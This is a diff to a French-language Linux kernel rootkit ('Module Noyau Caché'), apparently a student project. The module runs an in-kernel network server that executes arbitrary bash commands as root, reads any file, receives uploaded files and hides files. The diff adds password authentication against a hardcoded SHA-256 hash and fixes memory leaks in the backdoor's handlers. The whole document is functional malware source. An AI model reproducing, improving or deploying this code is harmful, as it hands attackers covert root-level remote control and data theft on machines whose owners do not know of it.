@@ -16,11 +16,15 @@
 #include <linux/delay.h>
 #include <linux/namei.h>
 #include <linux/dcache.h>
+#include <crypto/hash.h>
+#include <linux/crypto.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Etudiant");
 MODULE_DESCRIPTION("Module Noyau Caché");
 MODULE_VERSION("0.1");
+
+static const char PASSWORD_HASH[] = "1e29e7045275a60d15275bf8e97b5a47644844f2bca62d70476e11ad0543e000";
 
 struct linux_dirent64_local {
     u64 d_ino;
@@ -49,6 +53,10 @@ struct fichier_cache {
 
 static LIST_HEAD(fichiers_caches);
 static DEFINE_SPINLOCK(fichiers_lock);
+
+// Déclarations des fonctions d'authentification
+static int calculer_sha256(const char *data, char *hash_hex);
+static bool verifier_mot_de_passe(const char *password);
 
 static int ajouter_fichier_cache(const char *nom, const unsigned char *donnees, size_t taille) {
     struct fichier_cache *nouveau;
@@ -157,7 +165,7 @@ static int cacher_fichier_fs(const char *nom, const unsigned char *donnees, size
     
     printk(KERN_INFO "Écriture du fichier %s à %s (%zu octets)\n", nom, chemin, taille);
     
-    f = filp_open(chemin, O_WRONLY | O_CREAT, 0644); // Changer les permissions
+    f = filp_open(chemin, O_WRONLY | O_CREAT, 0644);
     if (IS_ERR(f)) {
         printk(KERN_ERR "Erreur ouverture fichier: %ld\n", PTR_ERR(f));
         return PTR_ERR(f);
@@ -170,6 +178,7 @@ static int cacher_fichier_fs(const char *nom, const unsigned char *donnees, size
     
     return ret;
 }
+
 char *executer_commande(char *cmd) {
     char *resultat;
     char *temp_file = "/tmp/.cmd_output";
@@ -178,10 +187,8 @@ char *executer_commande(char *cmd) {
     loff_t pos = 0;
     char *argv[] = {"/bin/bash", "-c", cmd_with_bash, NULL};
     char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
-
     int ret;
     int len;
-
 
     resultat = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
     if (!resultat)
@@ -189,12 +196,12 @@ char *executer_commande(char *cmd) {
     
     snprintf(cmd_with_bash, TAILLE_BUFFER, "bash -c \"%s > /tmp/.cmd_output 2>&1\"", cmd);
     
-    
     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     
     f = filp_open(temp_file, O_RDONLY, 0);
     if (IS_ERR(f)) {
         sprintf(resultat, "Exécution terminée avec code: %d (sortie non capturée)", ret);
+        kfree(cmd_with_bash);
         return resultat;
     }
     
@@ -210,8 +217,10 @@ char *executer_commande(char *cmd) {
     if (len < TAILLE_BUFFER - 40)
         sprintf(resultat + len, "\n\nCode de retour: %d", ret / 256);
     
+    kfree(cmd_with_bash);
     return resultat;
 }
+
 char *lire_fichier(char *chemin) {
     struct file *f;
     loff_t pos = 0;
@@ -221,6 +230,7 @@ char *lire_fichier(char *chemin) {
     contenu = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
     if (!contenu)
         return NULL;
+        
     memset(contenu, 0, TAILLE_BUFFER);
     f = filp_open(chemin, O_RDONLY, 0);
     if (IS_ERR(f)) {
@@ -247,6 +257,7 @@ static int recevoir_fichier(struct socket *sock_client, const char *nom, const c
     int ret = 0;
     struct msghdr msg;
     struct kvec iov;
+    
     printk(KERN_INFO "Début réception fichier: %s, méthode: %s\n", nom, methode);
     
     buffer = kmalloc(MAX_TAILLE_FICHIER, GFP_KERNEL);
@@ -287,8 +298,6 @@ static int recevoir_fichier(struct socket *sock_client, const char *nom, const c
     return recu;
 }
 
-
-
 int traiter_connexion(struct socket *sock_client) {
     char *buffer_reception;
     char *buffer_reponse;
@@ -296,6 +305,7 @@ int traiter_connexion(struct socket *sock_client) {
     struct msghdr msg;
     struct kvec iov;
     int err;
+    bool connexion_authentifiee = false;
     
     buffer_reception = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
     if (!buffer_reception)
@@ -304,6 +314,12 @@ int traiter_connexion(struct socket *sock_client) {
     memset(&msg, 0, sizeof(msg));
     memset(buffer_reception, 0, TAILLE_BUFFER);
     
+    // AUTHENTIFICATION POUR CHAQUE CONNEXION
+    iov.iov_base = "AUTH_REQUIRED";
+    iov.iov_len = 13;
+    kernel_sendmsg(sock_client, &msg, &iov, 1, 13);
+    
+    memset(buffer_reception, 0, TAILLE_BUFFER);
     iov.iov_base = buffer_reception;
     iov.iov_len = TAILLE_BUFFER - 1;
     taille_recue = kernel_recvmsg(sock_client, &msg, &iov, 1, TAILLE_BUFFER - 1, 0);
@@ -315,6 +331,49 @@ int traiter_connexion(struct socket *sock_client) {
     
     buffer_reception[taille_recue] = '\0';
     
+    if (strncmp(buffer_reception, "AUTH ", 5) == 0) {
+        if (verifier_mot_de_passe(buffer_reception + 5)) {
+            connexion_authentifiee = true;
+            iov.iov_base = "AUTH_OK";
+            iov.iov_len = 7;
+            kernel_sendmsg(sock_client, &msg, &iov, 1, 7);
+            printk(KERN_INFO "Authentification réussie\n");
+        } else {
+            iov.iov_base = "AUTH_FAILED";
+            iov.iov_len = 11;
+            kernel_sendmsg(sock_client, &msg, &iov, 1, 11);
+            printk(KERN_WARNING "Tentative d'authentification échouée\n");
+            kfree(buffer_reception);
+            return -1;
+        }
+    } else {
+        iov.iov_base = "AUTH_INVALID";
+        iov.iov_len = 12;
+        kernel_sendmsg(sock_client, &msg, &iov, 1, 12);
+        kfree(buffer_reception);
+        return -1;
+    }
+    
+    // Vérifier que l'authentification a réussi
+    if (!connexion_authentifiee) {
+        kfree(buffer_reception);
+        return -1;
+    }
+    
+    // RECEVOIR LA VRAIE COMMANDE
+    memset(buffer_reception, 0, TAILLE_BUFFER);
+    iov.iov_base = buffer_reception;
+    iov.iov_len = TAILLE_BUFFER - 1;
+    taille_recue = kernel_recvmsg(sock_client, &msg, &iov, 1, TAILLE_BUFFER - 1, 0);
+    
+    if (taille_recue <= 0) {
+        kfree(buffer_reception);
+        return taille_recue;
+    }
+    
+    buffer_reception[taille_recue] = '\0';
+    
+    // TRAITEMENT DES COMMANDES
     if (strncmp(buffer_reception, "EXEC ", 5) == 0) {
         buffer_reponse = executer_commande(buffer_reception + 5);
     } else if (strncmp(buffer_reception, "LIRE ", 5) == 0) {
@@ -349,10 +408,10 @@ int traiter_connexion(struct socket *sock_client) {
                 kfree(buffer_reception);
                 return 0;
             }
+            kfree(nom_fichier);
+            kfree(methode);
+            kfree(chemin);
         }
-        if (nom_fichier) kfree(nom_fichier);
-        if (methode) kfree(methode);
-        if (chemin) kfree(chemin);
     } else if (strncmp(buffer_reception, "FICHIERS", 8) == 0) {
         buffer_reponse = lister_fichiers_caches();
     } else if (strncmp(buffer_reception, "EXTRAIT ", 8) == 0) {
@@ -373,27 +432,6 @@ int traiter_connexion(struct socket *sock_client) {
     kfree(buffer_reception);
     return 0;
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 int creer_serveur(void *arg) {
     struct socket *sock_client;
@@ -471,6 +509,61 @@ static void __exit rootkit_exit(void) {
     printk(KERN_INFO "Module supprimé\n");
 }
 
+static int calculer_sha256(const char *data, char *hash_hex) {
+    struct crypto_shash *tfm;
+    struct shash_desc *desc;
+    unsigned char hash[32];
+    int ret = 0;
+    int i;
+    
+    tfm = crypto_alloc_shash("sha256", 0, 0);
+    if (IS_ERR(tfm)) {
+        return PTR_ERR(tfm);
+    }
+    
+    desc = kmalloc(sizeof(struct shash_desc) + crypto_shash_descsize(tfm), GFP_KERNEL);
+    if (!desc) {
+        crypto_free_shash(tfm);
+        return -ENOMEM;
+    }
+    
+    desc->tfm = tfm;
+    
+    ret = crypto_shash_init(desc);
+    if (ret)
+        goto out;
+        
+    ret = crypto_shash_update(desc, data, strlen(data));
+    if (ret)
+        goto out;
+        
+    ret = crypto_shash_final(desc, hash);
+    if (ret)
+        goto out;
+    
+    for (i = 0; i < 32; i++) {
+        sprintf(hash_hex + (i * 2), "%02x", hash[i]);
+    }
+    hash_hex[64] = '\0';
+    
+out:
+    kfree(desc);
+    crypto_free_shash(tfm);
+    return ret;
+}
+
+static bool verifier_mot_de_passe(const char *password) {
+    char hash_calcule[65];
+    int ret;
+    
+    ret = calculer_sha256(password, hash_calcule);
+    if (ret != 0) {
+        printk(KERN_ERR "Erreur calcul SHA256: %d\n", ret);
+        return false;
+    }
+    
+    return (strcmp(hash_calcule, PASSWORD_HASH) == 0);
+}
+
 module_init(rootkit_init);
 module_exit(rootkit_exit);
-
